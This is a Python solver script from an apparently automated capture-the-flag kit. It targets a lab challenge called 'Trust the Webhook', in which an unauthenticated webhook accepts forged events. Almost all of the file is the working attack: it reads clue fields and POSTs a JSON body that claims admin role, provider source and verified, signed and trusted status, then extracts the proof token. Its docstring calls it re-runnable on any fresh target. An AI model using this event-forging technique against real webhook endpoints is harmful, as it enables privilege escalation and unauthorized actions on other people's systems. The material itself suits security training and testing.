"""D26 "Trust the Webhook" (web-exploitation-day-19-trust-the-webhook): unauthenticated webhook trusts forged events.

Kit shape: /api/clues = {framework, feature_route, current_role, event_type, owner_scope}; GET feature_route -> 405
post_required; POST JSON with the clue event/scope plus forged trust/role fields ->
{"ok":true,"effect":"forged_event_consumed","evidence":"proof_..."}. Re-runnable on any fresh target.
"""
import json
import urllib.parse
import urllib.request

from lib import websolve


def exploit(base, clues):
    cl = clues if isinstance(clues, dict) else {}
    route = cl.get("feature_route")
    if not isinstance(route, str):
        return None
    ev = cl.get("event_type") or "case.promoted"
    scope = cl.get("owner_scope") or "executive"
    body = {"event_type": ev, "type": ev, "event": ev, "owner_scope": scope, "scope": scope, "owner": scope,
            "role": "admin", "current_role": "admin", "source": "provider", "sender": "provider",
            "verified": True, "signed": True, "trusted": True}
    req = urllib.request.Request(urllib.parse.urljoin(base, route), data=json.dumps(body).encode(), method="POST",
                                 headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            text = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        text = e.read().decode("utf-8", "replace")
    except Exception:
        return None
    return websolve.proof(text)


KEY_MAP = [(r"^owner_scope$", "day26_web_trust_the_webhook")]
HANDLERS = {"day26_web_trust_the_webhook": exploit}
